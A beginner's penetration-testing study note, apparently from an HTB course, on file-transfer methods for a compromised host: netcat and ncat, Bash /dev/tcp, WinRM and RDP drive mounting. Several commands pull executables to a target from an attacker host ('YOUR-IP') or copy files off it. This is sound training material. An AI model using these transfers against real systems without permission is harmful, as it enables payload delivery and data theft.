---
tags: [module/file-transfers, netcat, ncat, powershell-remoting, winrm, rdp, misc, level/beginner]
---

# Miscellaneous File Transfer Methods - Beginner's Guide

## Why Learn Multiple Methods?

Sometimes the obvious methods (HTTP, SMB, FTP) are blocked. You need alternatives:

- Netcat when no other tools exist
- PowerShell Remoting when WinRM is open
- RDP when you have GUI access

**The Rule:** The more methods you know, the less likely you'll get stuck.

---

## Netcat Basics

Netcat (nc) is the "Swiss Army knife" of networking. It can read/write data over TCP/UDP.

### What Netcat Can Do

- Create raw connections
- Transfer files
- Port scanning
- Reverse shells
- Simple servers

### Netcat vs Ncat

| Tool | Description |
|------|-------------|
| Netcat (nc) | Original version, minimal features |
| Ncat | Modern rewrite (from Nmap project), supports SSL, proxies |

**Note:** HTB Pwnbox uses Ncat as nc, ncat, and netcat.

---

## Method 1: Netcat File Transfer (Target Listens)

### Step 1: On Target (Receive)

nc -l -p 8000 > received_file.exe

### Step 2: On Your Machine (Send)

nc -q 0 TARGET-IP 8000 < file_to_send.exe

The `-q 0` tells Netcat to quit after sending.

### With Ncat (Target)

ncat -l -p 8000 --recv-only > received_file.exe

### With Ncat (Your Machine)

ncat --send-only TARGET-IP 8000 < file_to_send.exe

---

## Method 2: Netcat File Transfer (Your Machine Listens)

Use this when inbound connections to the target are blocked by a firewall.

### Step 1: On Your Machine (Listen)

sudo nc -l -p 443 -q 0 < file_to_send.exe

### Step 2: On Target (Connect)

nc YOUR-IP 443 > received_file.exe

### With Ncat (Your Machine)

sudo ncat -l -p 443 --send-only < file_to_send.exe

### With Ncat (Target)

ncat YOUR-IP 443 --recv-only > received_file.exe

---

## Method 3: Bash /dev/tcp (No Netcat Needed)

If Netcat isn't installed, Bash can do raw TCP connections.

### On Your Machine (Listen with Netcat)

sudo nc -l -p 443 -q 0 < file_to_send.exe

### On Target (Connect with Bash)

cat < /dev/tcp/YOUR-IP/443 > received_file.exe

**Requirement:** Bash compiled with --enable-net-redirections (default in most distros).

---

## Method 4: PowerShell Remoting (WinRM)

PowerShell Remoting (WinRM) is often enabled on Windows networks for remote administration.

### Check if WinRM is Available

Test-NetConnection -ComputerName TARGET -Port 5985

Ports:
- 5985 = HTTP
- 5986 = HTTPS

### Create a PowerShell Session

$Session = New-PSSession -ComputerName TARGET

### Copy File FROM Your Machine TO Target

Copy-Item -Path C:\local\file.txt -ToSession $Session -Destination C:\target\path\

### Copy File FROM Target TO Your Machine

Copy-Item -Path "C:\target\file.txt" -Destination C:\local\ -FromSession $Session

### Requirements

- Administrative access
- Member of Remote Management Users
- Explicit PowerShell Remoting permissions

---

## Method 5: RDP File Transfer

If you have GUI access via RDP, file transfer is easy.

### Copy and Paste

1. Right-click file on source machine
2. Copy
3. Right-click on destination (RDP session)
4. Paste

### Mount Local Drive (Linux to Windows)

With rdesktop:

rdesktop TARGET-IP -d DOMAIN -u USER -p PASS -r disk:linux='/local/path'

With xfreerdp:

xfreerdp /v:TARGET-IP /d:DOMAIN /u:USER /p:PASS /drive:linux,/local/path

### Access the Mounted Drive

In the RDP session, go to:

\\tsclient\linux

You can now copy files to/from this share.

### Mount Local Drive (Windows to Windows)

Using native mstsc.exe:
1. Open Remote Desktop Connection
2. Options → Local Resources
3. Click "More" under Local devices and resources
4. Select drives to share
5. Connect

**Note:** The shared drive is only accessible to YOUR session.

---

## Practice Makes Perfect

These techniques appear throughout the HTB Penetration Tester Job Role Path:

- Active Directory Enumeration and Attacks
- Pivoting, Tunnelling & Port Forwarding
- Attacking Enterprise Networks
- Shells & Payloads

**The Goal:** Try all these methods. Build muscle memory. When one fails, you'll have another ready.

---

## Method Comparison

| Method | Best For | Requirements |
|--------|----------|--------------|
| Netcat (target listens) | Outbound allowed | Netcat on target |
| Netcat (your machine listens) | Inbound blocked | Netcat on your machine |
| Bash /dev/tcp | No Netcat installed | Bash with net-redirections |
| PowerShell Remoting | Windows networks | WinRM open, privileges |
| RDP copy/paste | GUI access | RDP session |
| RDP mounted drive | Large transfers | RDP session, drive sharing |

---

## Key Takeaways

- Netcat is the universal fallback - learn it well
- Use `-q 0` with Netcat to auto-close
- Use `--recv-only` and `--send-only` with Ncat
- Bash /dev/tcp works when Netcat is missing
- PowerShell Remoting uses WinRM (ports 5985/5986)
- RDP copy/paste is simplest with GUI access
- Mounted drives work for large transfers
- Always have multiple methods ready
- Practice in labs until it's muscle memory
- The more you know, the less likely you'll get stuck
